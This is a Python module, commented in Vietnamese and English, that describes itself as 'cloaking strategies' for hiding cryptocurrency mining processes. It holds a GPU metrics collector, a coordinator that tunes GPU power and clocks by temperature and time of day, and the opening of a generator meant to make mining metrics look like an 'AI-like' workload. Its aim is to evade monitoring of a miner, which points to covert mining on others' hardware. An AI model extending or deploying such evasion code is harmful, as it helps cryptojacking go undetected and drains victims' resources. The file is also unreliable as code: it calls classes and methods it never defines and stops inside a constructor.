"""
**Module cloak_strategies.py** - Các **cloaking strategies** (chiến lược ngụy trang – phương pháp che giấu) cho **mining processes** (tiến trình khai thác – quy trình đào coin) (đồng bộ).
**CHÚ Ý**: Phiên bản này đã loại bỏ hoàn toàn chức năng **restoration** (khôi phục – phục hồi) - chỉ **cloaking** (ngụy trang – che giấu).
"""
# type: ignore

import logging
import traceback
import psutil
import threading
import time
import random
import json
from collections import deque
from datetime import datetime
import math
import statistics
# **ABC removed** (đã xóa ABC – loại bỏ Abstract Base Classes) - không còn cần sau khi xóa **CloakStrategy base class** (lớp cơ sở CloakStrategy)
from typing import Dict, List, Any, Optional, Type, cast, TYPE_CHECKING, Deque
from pathlib import Path

# Handle both package and standalone imports
try:
    from .utils import MiningProcess, StrategyType
    from .module_loggers import get_gpu_cloaking_logger
    from .error_management import get_error_reporter, ErrorCode, ErrorSeverity, report_error
except ImportError:
    # Fallback for standalone execution
    from utils import MiningProcess, StrategyType
    from module_loggers import get_gpu_cloaking_logger
    from error_management import get_error_reporter, ErrorCode, ErrorSeverity, report_error

# ✅ **STANDARDIZED** (chuẩn hóa): Lấy **unified logger instance** (thực thể logger thống nhất – đối tượng ghi nhật ký đồng bộ) (khớp **hierarchy** – phân cấp)
cloak_logger = get_gpu_cloaking_logger()

# ✅ **ERROR REPORTER** (báo cáo lỗi): Lấy **centralized error reporter instance** (thực thể báo cáo lỗi tập trung – đối tượng báo lỗi trung tâm)
error_reporter = get_error_reporter()

# Optional dependency: numpy (thư viện tính toán số – phụ thuộc tuỳ chọn)
try:
    import numpy as np  # type: ignore
    _NUMPY_AVAILABLE = True
except Exception:
    np = None  # type: ignore
    _NUMPY_AVAILABLE = False
    cloak_logger.warning("[MetricsHub] [numpy] (thư viện numpy – thư viện tính toán số) not available (không khả dụng) – using pure-Python fallback statistics (sử dụng thống kê thuần Python – cơ chế dự phòng)")

# **GPU-Only Mode** (chế độ chỉ GPU – hoạt động riêng card đồ họa): **CPU ResourceManager removed** (đã xóa trình quản lý tài nguyên CPU) cho **GPU-only operations** (hoạt động chỉ GPU – thao tác riêng card đồ họa)
if TYPE_CHECKING:
    class GPUResourceManager: ...
    class NetworkResourceManager: ...
    class DiskIOResourceManager: ...
    class CacheResourceManager: ...
    class MemoryResourceManager: ...
else:
    GPUResourceManager = Any  # type: ignore
    NetworkResourceManager = Any  # type: ignore
    DiskIOResourceManager = Any  # type: ignore
    CacheResourceManager = Any  # type: ignore
    MemoryResourceManager = Any  # type: ignore


###############################################################################
#                         **METRICS COLLECTION HUB** (TRUNG TÂM THU THẬP SỐ LIỆU)                        #
###############################################################################

class MetricsCollectionHub:
    """
    Metrics Collection Hub - Trung tâm thu thập và phân tích số liệu GPU/Process.
    
    Features:
    - Circular buffer (bộ đệm vòng) để lưu trữ số liệu hiệu quả
    - Data aggregation (tổng hợp dữ liệu) với mean, std, percentiles
    - JSON logging (ghi log định dạng JSON) cho phân tích
    - Metrics export API (API xuất số liệu) cho monitoring tools
    - Thread-safe operations (hoạt động an toàn luồng)
    """
    
    def __init__(self, buffer_size: int = 1000, log_interval: int = 60):
        """
        Initialize MetricsCollectionHub.
        
        :param buffer_size: Kích thước buffer tối đa cho mỗi metric type
        :param log_interval: Khoảng thời gian (giây) giữa các lần ghi log tự động
        """
        self.logger = cloak_logger
        self.buffer_size = buffer_size
        self.log_interval = log_interval
        
        # Circular buffers cho các loại metrics khác nhau
        self.metrics_buffers: Dict[str, Deque[Dict[str, Any]]] = {
            'gpu_usage': deque(maxlen=buffer_size),      # GPU utilization metrics
            'memory_usage': deque(maxlen=buffer_size),   # Memory (RAM/VRAM) metrics  
            'process_health': deque(maxlen=buffer_size), # Process health scores
            'temperature': deque(maxlen=buffer_size),    # GPU temperature metrics
            'power': deque(maxlen=buffer_size),          # Power consumption metrics
            'clock_speeds': deque(maxlen=buffer_size),   # GPU clock speeds
            'io_activity': deque(maxlen=buffer_size),    # I/O read/write metrics
            'network': deque(maxlen=buffer_size)         # Network traffic metrics
        }
        
        # Thread locks cho thread-safe operations
        self.buffer_locks: Dict[str, threading.Lock] = {
            key: threading.Lock() for key in self.metrics_buffers.keys()
        }
        
        # Statistics cache (cache thống kê)
        self.stats_cache: Dict[str, Dict[str, Any]] = {}
        self.stats_cache_lock = threading.Lock()
        self.last_stats_update = 0
        
        # JSON log file path
        self.log_dir = Path("/tmp/gpu_metrics")
        self.log_dir.mkdir(parents=True, exist_ok=True)
        
        # Background logging thread
        self.logging_thread = None
        self.stop_logging = threading.Event()
        
        self.logger.info(f"[MetricsHub] Initialized with buffer_size={buffer_size}, log_interval={log_interval}s")
    
    def add_metric(self, metric_type: str, data: Dict[str, Any]) -> bool:
        """
        Add a new metric to the appropriate buffer.
        
        :param metric_type: Loại metric (gpu_usage, memory_usage, etc.)
        :param data: Dictionary chứa metric data với timestamp
        :return: True nếu thành công
        """
        self.logger.debug(f" [MetricsHub.add_metric] Entry - type: {metric_type}, data_keys: {list(data.keys())}")
        
        if metric_type not in self.metrics_buffers:
            self.logger.warning(f" [MetricsHub.add_metric] Unknown metric type: {metric_type}, available: {list(self.metrics_buffers.keys())}")
            return False
        
        # Add timestamp nếu chưa có
        if 'timestamp' not in data:
            data['timestamp'] = datetime.now().isoformat()
            self.logger.debug(f" [MetricsHub.add_metric] Added timestamp: {data['timestamp']}")
        
        try:
            with self.buffer_locks[metric_type]:
                buffer_len_before = len(self.metrics_buffers[metric_type])
                self.metrics_buffers[metric_type].append(data)
                buffer_len_after = len(self.metrics_buffers[metric_type])
                self.logger.debug(f" [MetricsHub.add_metric] Success - {metric_type} buffer: {buffer_len_before}→{buffer_len_after}")
            return True
        except Exception as e:
            self.logger.error(f" [MetricsHub.add_metric] Failed - type: {metric_type}, error: {e}", exc_info=True)
            return False
    
    def get_metrics(self, metric_type: str, last_n: Optional[int] = None) -> List[Dict[str, Any]]:
        """
        Get metrics from buffer.
        
        :param metric_type: Loại metric cần lấy
        :param last_n: Số lượng metrics gần nhất cần lấy (None = tất cả)
        :return: List of metric dictionaries
        """
        self.logger.debug(f"🔍 [MetricsHub.get_metrics] Entry - type: {metric_type}, last_n: {last_n}")
        
        if metric_type not in self.metrics_buffers:
            self.logger.warning(f"⚠️ [MetricsHub.get_metrics] Unknown metric type: {metric_type}")
            return []
        
        with self.buffer_locks[metric_type]:
            buffer = self.metrics_buffers[metric_type]
            buffer_size = len(buffer)
            if last_n is None:
                result = list(buffer)
                self.logger.debug(f"📊 [MetricsHub.get_metrics] Returning all {buffer_size} metrics for {metric_type}")
            else:
                result = list(buffer)[-last_n:]
                self.logger.debug(f"📊 [MetricsHub.get_metrics] Returning last {len(result)}/{buffer_size} metrics for {metric_type}")
            return result
    
    def calculate_statistics(self, metric_type: str, field: str) -> Dict[str, Any]:
        """
        Calculate statistics (mean, std, min, max, percentiles) cho một field cụ thể.
        
        :param metric_type: Loại metric
        :param field: Field name trong metric data để tính toán
        :return: Dictionary chứa statistics
        """
        self.logger.debug(f"📈 [MetricsHub.calculate_statistics] Entry - type: {metric_type}, field: {field}")
        
        metrics = self.get_metrics(metric_type)
        if not metrics:
            self.logger.warning(f"⚠️ [MetricsHub.calculate_statistics] No metrics found for type: {metric_type}")
            return {}
        
        # Extract values for the specified field
        values = []
        for m in metrics:
            if field in m:
                try:
                    values.append(float(m[field]))
                except (ValueError, TypeError):
                    continue
        
        if not values:
            return {}
        
        # Calculate statistics using numpy nếu khả dụng; fallback thuần Python nếu không có numpy
        if _NUMPY_AVAILABLE and np is not None:  # type: ignore
            arr = np.array(values, dtype=float)  # type: ignore
            stats = {
                'count': len(values),
                'mean': float(np.mean(arr)),  # type: ignore
                'std': float(np.std(arr)),    # type: ignore
                'min': float(np.min(arr)),    # type: ignore
                'max': float(np.max(arr)),    # type: ignore
                'p25': float(np.percentile(arr, 25)),  # type: ignore
                'p50': float(np.percentile(arr, 50)),  # type: ignore (median)
                'p75': float(np.percentile(arr, 75)),  # type: ignore
                'p90': float(np.percentile(arr, 90)),  # type: ignore
                'p95': float(np.percentile(arr, 95)),  # type: ignore
                'p99': float(np.percentile(arr, 99))   # type: ignore
            }
            return stats
        
        # Fallback: Thuần Python
        n = len(values)
        sorted_vals = sorted(values)
        mean_val = sum(values) / n
        try:
            std_val = statistics.pstdev(values)
        except Exception:
            variance = sum((x - mean_val) ** 2 for x in values) / n
            std_val = math.sqrt(variance)
        
        def percentile_linear(sorted_values: List[float], p: float) -> float:
            if not sorted_values:
                return float('nan')
            k = (p / 100.0) * (n - 1)
            f = math.floor(k)
            c = math.ceil(k)
            if f == c:
                return float(sorted_values[int(k)])
            d0 = sorted_values[int(f)] * (c - k)
            d1 = sorted_values[int(c)] * (k - f)
            return float(d0 + d1)
        
        stats = {
            'count': n,
            'mean': float(mean_val),
            'std': float(std_val),
            'min': float(sorted_vals[0]),
            'max': float(sorted_vals[-1]),
            'p25': percentile_linear(sorted_vals, 25),
            'p50': percentile_linear(sorted_vals, 50),
            'p75': percentile_linear(sorted_vals, 75),
            'p90': percentile_linear(sorted_vals, 90),
            'p95': percentile_linear(sorted_vals, 95),
            'p99': percentile_linear(sorted_vals, 99)
        }
        
        self.logger.info(f"[MetricsHub] Fallback stats (no numpy) for {metric_type}.{field}: count={n}")
        return stats
    
    def aggregate_all_metrics(self) -> Dict[str, Any]:
        """
        Aggregate tất cả metrics và tính statistics cho mỗi loại.
        
        :return: Dictionary chứa aggregated metrics và statistics
        """
        aggregated = {
            'timestamp': time.time(),
            'metrics': {}
        }
        
        # Define key fields for each metric type
        key_fields = {
            'gpu_usage': ['utilization', 'memory_used'],
            'memory_usage': ['memory_usage_mb', 'gpu_memory_mb'],
            'process_health': ['health_score', 'cpu_percent'],
            'temperature': ['temperature'],
            'power': ['power_draw', 'power_limit'],
            'clock_speeds': ['graphics_clock', 'memory_clock'],
            'io_activity': ['read_bytes', 'write_bytes'],
            'network': ['bytes_sent', 'bytes_recv']
        }
        
        for metric_type, fields in key_fields.items():
            type_stats = {}
            for field in fields:
                stats = self.calculate_statistics(metric_type, field)
                if stats:
                    type_stats[field] = stats
            
            if type_stats:
                aggregated['metrics'][metric_type] = type_stats
        
        # Update cache
        with self.stats_cache_lock:
            self.stats_cache = aggregated
            self.last_stats_update = time.time()
        
        return aggregated
    
    def export_to_json(self, filepath: Optional[Path] = None) -> Path:
        """
        Export metrics to JSON file.
        
        :param filepath: Custom filepath (nếu None, tự động tạo với timestamp)
        :return: Path to exported file
        """
        if filepath is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filepath = self.log_dir / f"metrics_{timestamp}.json"
        
        # Aggregate all metrics
        aggregated = self.aggregate_all_metrics()
        
        # Add raw metrics samples
        aggregated['raw_samples'] = {}
        for metric_type in self.metrics_buffers.keys():
            # Get last 10 samples of each type
            samples = self.get_metrics(metric_type, last_n=10)
            if samples:
                aggregated['raw_samples'][metric_type] = samples
        
        # Write to JSON file
        with open(filepath, 'w') as f:
            json.dump(aggregated, f, indent=2, default=str)
        
        self.logger.info(f"[MetricsHub] Exported metrics to {filepath}")
        return filepath
    
    def start_background_logging(self):
        """
        Start background thread để tự động log metrics theo interval.
        """
        if self.logging_thread and self.logging_thread.is_alive():
            self.logger.warning("[MetricsHub] Background logging already running")
            return
        
        def logging_worker():
            while not self.stop_logging.is_set():
                try:
                    # Export metrics to JSON
                    self.export_to_json()
                    
                    # Log summary to console
                    stats = self.aggregate_all_metrics()
                    self.logger.info(f"[MetricsHub] Periodic stats update: {len(stats['metrics'])} metric types tracked")
                    
                except Exception as e:
                    self.logger.error(f"[MetricsHub] Error in background logging: {e}")
                
                # Wait for next interval
                self.stop_logging.wait(self.log_interval)
        
        self.logging_thread = threading.Thread(target=logging_worker, daemon=True)
        self.logging_thread.start()
        self.logger.info("[MetricsHub] Started background logging thread")
    
    def stop_background_logging(self):
        """
        Stop background logging thread.
        """
        if self.logging_thread:
            self.stop_logging.set()
            self.logging_thread.join(timeout=5)
            self.logger.info("[MetricsHub] Stopped background logging thread")
    
    def get_export_api_data(self) -> Dict[str, Any]:
        """
        Get data formatted cho external monitoring tools API.
        
        Format phù hợp với Prometheus, Grafana, etc.
        
        :return: Dictionary với metrics theo format chuẩn
        """
        # Use cached stats if recent enough
        with self.stats_cache_lock:
            if time.time() - self.last_stats_update < 5:  # Cache for 5 seconds
                return self.stats_cache
        
        # Otherwise calculate fresh
        return self.aggregate_all_metrics()
    
    def clear_metrics(self, metric_type: Optional[str] = None):
        """
        Clear metrics buffers.
        
        :param metric_type: Clear specific type, hoặc None để clear tất cả
        """
        if metric_type:
            if metric_type in self.metrics_buffers:
                with self.buffer_locks[metric_type]:
                    self.metrics_buffers[metric_type].clear()
                self.logger.info(f"[MetricsHub] Cleared {metric_type} metrics")
        else:
            for key in self.metrics_buffers.keys():
                with self.buffer_locks[key]:
                    self.metrics_buffers[key].clear()
            self.logger.info("[MetricsHub] Cleared all metrics")
    
    def __del__(self):
        """Cleanup on deletion."""
        self.stop_background_logging()

###############################################################################
#                         **SIMPLIFIED CLOAK COORDINATOR** (BỘ ĐIỀU PHỐI NGỤY TRANG ĐƠN GIẢN HÓA)                        #
###############################################################################

from .utils import CloakRequest, CloakResult
from .resource_control import HardwareController

class CloakCoordinator:
    """
    **Simple coordinator** (bộ điều phối đơn giản – trình phối hợp cơ bản) - không có **complex factory** (factory phức tạp – nhà máy tạo đối tượng) hoặc **abstract strategies** (chiến lược trừu tượng – phương pháp tổng quát).
    **Pipeline Stage 2** (Giai đoạn 2 của pipeline – bước 2 trong quy trình): Nhận **CloakRequest** (yêu cầu ngụy trang) từ **ResourceManager** (trình quản lý tài nguyên) -> Chọn **strategy** (chiến lược) -> Gọi **HardwareController** (bộ điều khiển phần cứng).
    """
    
    def __init__(self, config: Dict[str, Any]):
        """
        **Initialize CloakCoordinator** (khởi tạo CloakCoordinator – thiết lập bộ điều phối ngụy trang) với **config** (cấu hình).
        
        :param config: **Configuration dictionary** (từ điển cấu hình – dict thiết lập)
        """
        self.config = config
        self.logger = cloak_logger  # Sử dụng **existing logger** (logger hiện có – bộ ghi nhật ký sẵn có)
        
        # **Initialize hardware controller** (khởi tạo bộ điều khiển phần cứng) cho **Stage 3** (giai đoạn 3)
        self.hw_controller = HardwareController(config)

        # ✅ Initialize intelligent GPU coordinator by default (non-blocking if unavailable)
        try:
            self.gpu_cloak_strategy = GpuCloakStrategy(
                config=self.config,
                logger=self.logger,
                hw_controller=self.hw_controller
            )
        except Exception:
            # Không chặn pipeline nếu không khởi tạo được intelligent coordinator
            self.gpu_cloak_strategy = None
        
        # **INTELLIGENCE LAYER: Strategy scoring weights** (trọng số chấm điểm chiến lược)
        self.strategy_weights = {
            'temperature': 0.35,     # Temperature safety is critical
            'power_efficiency': 0.25,  # Power usage optimization
            'performance': 0.20,     # Mining/compute performance
            'resource_usage': 0.10,  # Memory/GPU utilization
            'system_load': 0.10     # Overall system load
        }
        
        # **Decision tree thresholds** (ngưỡng cây quyết định)
        self.decision_thresholds = {
            'temp_critical': 78,
            'temp_warning': 72,
            'temp_safe': 65,
            'power_high': 200,
            'power_medium': 150,
            'power_low': 100,
            'gpu_util_high': 80,
            'gpu_util_medium': 50,
            'gpu_util_low': 30
        }
        
        # **Context awareness state** (trạng thái nhận thức ngữ cảnh)
        self.context_state = {
            'time_of_day': None,     # Peak vs off-peak hours
            'system_load': 'normal',  # low/normal/high
            'thermal_state': 'safe',  # safe/warning/critical
            'optimization_mode': 'balanced'  # aggressive/balanced/conservative
        }
        
        # **Strategy history for learning** (lịch sử chiến lược để học)
        self.strategy_history = deque(maxlen=100)
        
        self.logger.info("[CS] **CloakCoordinator initialized** (CloakCoordinator đã khởi tạo – bộ điều phối ngụy trang đã thiết lập) - **Stage 2 ready** (giai đoạn 2 sẵn sàng)")
    
    def select_optimal_strategy(self, pid: int, current_metrics: Dict[str, Any]) -> str:
        """
        **INTELLIGENCE LAYER: Dynamic Strategy Selector** (bộ chọn chiến lược động)
        Uses decision tree logic and feature scoring to select optimal strategy
        
        :param pid: Process ID
        :param current_metrics: Current system metrics (temp, power, gpu util, etc.)
        :return: Selected strategy name
        """
        # **Step 1: Feature extraction** (trích xuất đặc trưng)
        features = self.extract_features(current_metrics)
        
        # **Step 2: Update context awareness** (cập nhật nhận thức ngữ cảnh)
        self.update_context_awareness(features)
        
        # **Step 3: Decision tree logic** (logic cây quyết định)
        # Critical temperature - immediate safety response
        if features['temperature'] >= self.decision_thresholds['temp_critical']:
            self.logger.warning(f"🔥 Critical temp for PID {pid}: {features['temperature']}°C")
            return 'emergency_cooling'
            
        # **Step 4: Score each strategy** (chấm điểm mỗi chiến lược)
        strategy_scores = {}
        
        # GPU strategy scoring
        gpu_score = self.calculate_strategy_score('gpu', features)
        strategy_scores['gpu'] = gpu_score
        
        # Network strategy scoring (for distributed workloads)
        if features['network_activity'] > 0.5:
            network_score = self.calculate_strategy_score('network', features)
            strategy_scores['network'] = network_score
            
        # Memory strategy scoring (for high RAM usage)
        if features['memory_usage'] > 70:
            memory_score = self.calculate_strategy_score('memory', features)
            strategy_scores['memory'] = memory_score
            
        # **Step 5: Select highest scoring strategy** (chọn chiến lược điểm cao nhất)
        best_strategy = max(strategy_scores, key=strategy_scores.get)
        best_score = strategy_scores[best_strategy]
        
        # **Step 6: Record decision for learning** (ghi lại quyết định để học)
        self.strategy_history.append({
            'timestamp': time.time(),
            'pid': pid,
            'features': features,
            'context': self.context_state.copy(),
            'selected_strategy': best_strategy,
            'score': best_score,
            'all_scores': strategy_scores
        })
        
        self.logger.info(f"🎯 Selected strategy '{best_strategy}' (score: {best_score:.2f}) for PID {pid}")
        return best_strategy
    
    def extract_features(self, metrics: Dict[str, Any]) -> Dict[str, float]:
        """
        **Extract normalized features** (trích xuất đặc trưng chuẩn hóa) from raw metrics
        
        :param metrics: Raw system metrics
        :return: Normalized features (0-1 scale)
        """
        features = {}
        
        # Temperature feature (0=cold, 1=critical)
        temp = metrics.get('temperature', 50)
        features['temperature'] = temp
        features['temp_normalized'] = min(1.0, max(0, (temp - 30) / 50))
        
        # Power feature (0=low, 1=high)
        power = metrics.get('power_draw', 100)
        features['power'] = power
        features['power_normalized'] = min(1.0, power / 300)
        
        # GPU utilization (0=idle, 1=full)
        gpu_util = metrics.get('gpu_utilization', 50)
        features['gpu_util'] = gpu_util
        features['gpu_util_normalized'] = gpu_util / 100
        
        # Memory usage
        mem_used = metrics.get('memory_used_mb', 0)
        mem_total = metrics.get('memory_total_mb', 8000)
        features['memory_usage'] = (mem_used / mem_total * 100) if mem_total > 0 else 0
        
        # Network activity (placeholder)
        features['network_activity'] = metrics.get('network_activity', 0)
        
        # System load
        features['cpu_load'] = metrics.get('cpu_percent', 50)
        
        return features
    
    def update_context_awareness(self, features: Dict[str, float]):
        """
        **Update context state** (cập nhật trạng thái ngữ cảnh) based on current features
        
        :param features: Extracted features
        """
        import datetime
        
        # **Time of day awareness** (nhận thức thời gian trong ngày)
        current_hour = datetime.datetime.now().hour
        if 9 <= current_hour <= 17:
            self.context_state['time_of_day'] = 'business_hours'
        elif 18 <= current_hour <= 23:
            self.context_state['time_of_day'] = 'peak_hours'
        else:
            self.context_state['time_of_day'] = 'off_peak'
            
        # **Thermal state** (trạng thái nhiệt)
        temp = features['temperature']
        if temp >= self.decision_thresholds['temp_critical']:
            self.context_state['thermal_state'] = 'critical'
        elif temp >= self.decision_thresholds['temp_warning']:
            self.context_state['thermal_state'] = 'warning'
        else:
            self.context_state['thermal_state'] = 'safe'
            
        # **System load state** (trạng thái tải hệ thống)
        if features['gpu_util'] > 80 or features['cpu_load'] > 80:
            self.context_state['system_load'] = 'high'
        elif features['gpu_util'] < 30 and features['cpu_load'] < 30:
            self.context_state['system_load'] = 'low'
        else:
            self.context_state['system_load'] = 'normal'
            
        # **Optimization mode** (chế độ tối ưu)
        if self.context_state['thermal_state'] == 'critical':
            self.context_state['optimization_mode'] = 'conservative'
        elif self.context_state['time_of_day'] == 'off_peak':
            self.context_state['optimization_mode'] = 'aggressive'
        else:
            self.context_state['optimization_mode'] = 'balanced'
    
    def calculate_strategy_score(self, strategy: str, features: Dict[str, float]) -> float:
        """
        **Calculate weighted score** (tính điểm có trọng số) for a strategy
        
        :param strategy: Strategy name
        :param features: Normalized features
        :return: Score (0-100)
        """
        score = 0.0
        
        if strategy == 'gpu':
            # GPU strategy excels when GPU util is medium-high but temp is safe
            score += (1.0 - features['temp_normalized']) * self.strategy_weights['temperature'] * 100
            score += features['gpu_util_normalized'] * self.strategy_weights['performance'] * 100
            score += (1.0 - features['power_normalized']) * self.strategy_weights['power_efficiency'] * 100
            
            # Context bonuses
            if self.context_state['time_of_day'] == 'off_peak':
                score *= 1.2  # 20% bonus during off-peak
            if self.context_state['thermal_state'] == 'safe':
                score *= 1.1  # 10% bonus when thermally safe
                
        elif strategy == 'network':
            # Network strategy for distributed workloads
            score += features['network_activity'] * self.strategy_weights['performance'] * 100
            score += (1.0 - features['temp_normalized']) * self.strategy_weights['temperature'] * 50
            
        elif strategy == 'memory':
            # Memory strategy for high RAM usage scenarios
            score += (features['memory_usage'] / 100) * self.strategy_weights['resource_usage'] * 100
            score += (1.0 - features['cpu_load'] / 100) * self.strategy_weights['system_load'] * 100
            
        elif strategy == 'emergency_cooling':
            # Emergency strategy when temperature is critical
            if features['temperature'] >= self.decision_thresholds['temp_critical']:
                score = 100  # Maximum priority
            else:
                score = 0
                
        return min(100, max(0, score))  # Clamp to 0-100
    
    def process_request(self, request: CloakRequest) -> CloakResult:
        """**Stage 2: Strategy Coordinator** (Giai đoạn 2: Điều phối chiến lược – bộ phối hợp phương pháp)
        
        **Trách nhiệm chính** (main responsibilities – nhiệm vụ chủ yếu) của **Stage 2** (giai đoạn 2):
        1. Quyết định **strategy** (chiến lược) dựa trên **config** (cấu hình)
        2. Chuẩn bị **params** (tham số) cho **strategy** đó
        3. **Forward** (chuyển tiếp) đến **hardware controller** (bộ điều khiển phần cứng)
        
        :param request: **CloakRequest** (yêu cầu ngụy trang) từ **ResourceManager** (trình quản lý tài nguyên) (chỉ có **PID** & **metadata** – mã tiến trình & siêu dữ liệu)
        :return: **CloakResult** (kết quả ngụy trang) từ **HardwareController** (bộ điều khiển phần cứng)
        """
        try:
            # **Stage 2** quyết định **strategy** (chiến lược) (không phải **Stage 1**!)
            strategy = request.strategy_name
            if not strategy:
                # **Auto-select strategy** (tự động chọn chiến lược) dựa trên **config** (cấu hình)
                strategy = getattr(self.config, 'default_strategy', 'gpu')
                self.logger.info(f"[CS] **Auto-selected strategy** (đã tự động chọn chiến lược) '{strategy}' từ **config** (cấu hình)")
            
            self.logger.info(f"[CS] **Stage 2**: Đang xử lý **PID** {request.pid} (mã tiến trình) với **strategy** '{strategy}' (chiến lược)")
            
            # **Route** (định tuyến – chuyển hướng) đến **correct strategy handler** (bộ xử lý chiến lược đúng – trình xử lý phương pháp phù hợp)
            if strategy == 'gpu':
                # Chuẩn bị **GPU params** (tham số GPU – thông số card đồ họa) từ **config** (cấu hình)
                request.params = {
                    'gpu_index': 0,
                    'power_limit': getattr(self.config, 'gpu_power_limit', 150),
                    'memory_clock': getattr(self.config, 'gpu_memory_clock', 810),
                    'sm_clock': getattr(self.config, 'gpu_sm_clock', 1200),
                    'temp_threshold': getattr(self.config, 'gpu_temp_threshold', 75)
                }
                return self._apply_gpu_strategy(request)
                
            elif strategy == 'network':
                # Chuẩn bị **network params** (tham số mạng – thông số kết nối) từ **config** (cấu hình)
                request.params = {
                    'bandwidth_limit': getattr(self.config, 'network_bandwidth_limit', 100),
                    'interface': getattr(self.config, 'network_interface', 'eth0')
                }
                return self._apply_network_strategy(request)
                
            elif strategy == 'disk_io':
                # Chuẩn bị **disk I/O params** (tham số I/O đĩa – thông số nhập/xuất ổ cứng) (**placeholder** for now – tạm thời để trống)
                request.params = {}
                return self._apply_disk_io_strategy(request)
                
            elif strategy == 'cache':
                # Chuẩn bị **cache params** (tham số bộ nhớ đệm – thông số lưu trữ tạm) (**placeholder** – tạm thời để trống)
                request.params = {}
                return self._apply_cache_strategy(request)
                
            elif strategy == 'memory':
                # Chuẩn bị **memory params** (tham số bộ nhớ – thông số RAM) (**placeholder** – tạm thời để trống)
                request.params = {}
                return self._apply_memory_strategy(request)
                
            else:
                self.logger.error(f"[CS] **Unknown strategy** (chiến lược không xác định – phương pháp không nhận diện được): {strategy}")
                return CloakResult(
                    success=False,
                    pid=request.pid,
                    error_msg=f"**Unknown strategy** (chiến lược không xác định): {strategy}"
                )
                
        except Exception as e:
            self.logger.error(f"[CS] **Exception in process_request** (ngoại lệ trong process_request – lỗi khi xử lý yêu cầu): {e}")
            return CloakResult(
                success=False,
                pid=request.pid,
                error_msg=str(e)
            )
    
    def _apply_gpu_strategy(self, request: CloakRequest) -> CloakResult:
        """**Stage 2: Route GPU strategy** (Giai đoạn 2: Định tuyến chiến lược GPU) với **INTELLIGENT COORDINATOR** (bộ điều phối thông minh – trình phối hợp tự động)
        
        ✅ **ENHANCED** (nâng cao): Sử dụng **GpuCloakStrategy** làm **intelligent coordinator** (bộ điều phối thông minh)
        để thêm các **logic điều chỉnh động** (logic tự động điều chỉnh – thuật toán thích ứng) trước khi **forward** (chuyển tiếp) xuống **HardwareController** (bộ điều khiển phần cứng)
        
        :param request: **CloakRequest** (yêu cầu ngụy trang) với **GPU params** (tham số GPU) đã được **prepare** (chuẩn bị) ở **Stage 1** (giai đoạn 1)
        :return: **CloakResult** (kết quả ngụy trang) từ **HardwareController** (qua **intelligent coordinator** – bộ điều phối thông minh)
        """
        self.logger.info(f"[CS] 🎯 **Routing GPU strategy** (định tuyến chiến lược GPU – chuyển hướng phương pháp card đồ họa) qua **INTELLIGENT COORDINATOR** (bộ điều phối thông minh) cho **PID** {request.pid}")

        try:
            # Xóa phần lazy GPU plugin activation

            # Kiểm tra nếu **GpuCloakStrategy** khả dụng làm **intelligent coordinator** (bộ điều phối thông minh)
            if hasattr(self, 'gpu_cloak_strategy') and self.gpu_cloak_strategy:
                # **USE INTELLIGENT COORDINATOR** (sử dụng bộ điều phối thông minh)
                self.logger.info("[CS] 🧠 **Using GpuCloakStrategy as intelligent coordinator** (đang dùng GpuCloakStrategy làm bộ điều phối thông minh – sử dụng chiến lược GPU như trình phối hợp tự động)")

                # Chuẩn bị **request** (yêu cầu) cho **intelligent coordinator** (bộ điều phối thông minh)
                coordinator_request = {
                    'pid': request.pid,
                    'params': request.params
                }

                # Apply intelligent coordination (adds adaptive logic)
                coordinator_result = self.gpu_cloak_strategy.intelligent_apply(coordinator_request)

                # Convert result to CloakResult
                if coordinator_result.get('success'):
                    self.logger.info(f"[CS] ✅ Intelligent coordination successful for PID {request.pid}")
                    return CloakResult(
                        success=True,
                        pid=request.pid,
                        strategy_name='gpu_intelligent',
                        applied_params=coordinator_result.get('applied_params', request.params),
                        message=coordinator_result.get('message', 'GPU controls applied via intelligent coordinator')
                    )
                else:
                    # Check if emergency mode was activated
                    if coordinator_result.get('emergency_mode'):
                        self.logger.warning(f"[CS] 🚨 Emergency mode activated for PID {request.pid}")
                        return CloakResult(
                            success=True,  # Emergency mode is still "success"
                            pid=request.pid,
                            strategy_name='gpu_emergency',
                            applied_params=coordinator_result.get('params', {}),
                            message='Emergency GPU configuration applied'
                        )
                    else:
                        self.logger.error(f"[CS] ❌ Intelligent coordination failed (phối hợp thông minh thất bại – lỗi điều phối): {coordinator_result.get('error')}")
                        # Fallback to direct hardware controller
                        self.logger.info("[CS] 🔄 Falling back to direct hardware controller (quay về bộ điều khiển phần cứng trực tiếp – cơ chế dự phòng)")

            else:
                # No intelligent coordinator available, use direct routing
                self.logger.info("[CS] 📡 Direct routing to hardware controller (định tuyến trực tiếp tới bộ điều khiển phần cứng – không có [intelligent coordinator] (bộ điều phối thông minh))")

            # FALLBACK: Direct forward to hardware controller
            control_params = {
                'pid': request.pid,
                **request.params  # Forward ALL params as-is from Stage 1
            }

            result = self.hw_controller.apply_gpu_controls(control_params)

            if result.success:
                self.logger.info(f"[CS] ✅ GPU strategy routed successfully for PID {request.pid}")
            else:
                self.logger.error(f"[CS] ❌ GPU strategy routing failed: {result.error_msg}")

            return result

        except Exception as e:
            self.logger.error(f"[CS] ❌ GPU strategy exception (ngoại lệ chiến lược GPU – lỗi áp dụng GPU): {e}")
            return CloakResult(
                success=False,
                pid=request.pid,
                strategy_name='gpu',
                error_msg=f"GPU strategy failed: {str(e)}"
            )
    
###############################################################################
#                 GPU STRATEGY: GpuCloakStrategy                              #
###############################################################################

import math
import json
from collections import deque
import os

class AdaptivePatternGenerator:
    """
    **Adaptive Pattern Generator** (Bộ tạo pattern thích ứng – tạo mẫu biến động tự điều chỉnh)
    Tạo các **AI-like patterns** (pattern giống AI – mẫu hoạt động như trí tuệ nhân tạo) cho GPU metrics
    không phụ thuộc vào **GPU plugins** (plugin GPU – phần mở rộng card đồ họa)
    """
    
    def __init__(self, profile: str = "medium"):
        """
        Initialize với **optimization profile** (hồ sơ tối ưu – cấu hình tối ưu hóa)
        :param profile: "light", "medium", hoặc "heavy"
        """
        self.logger = cloak_logger
        self.profile_name = profile
        self.config = self._load_config()
        self.profile = self.config['profiles'].get(profile, self.config['profiles']['medium'])
        
        # Pattern state tracking
        self.cycle_position = 0
        self.cycle_duration = self.profile['cycle_duration']
        self.pattern_history = deque(maxlen=100)
        self.baseline_power = None
        self.current_phase = "warmup"
        self.phase_timer = 0
        
        # Jitter và variation layers
        self.jitter_factor = self.profile['jitter_factor']
        self.power_variation = self.profile['power_variation']
        
        # Mean reversion parameters
        self.mean_reversion_strength = 0.7
        self.mean_reversion_threshold = 1.5
        
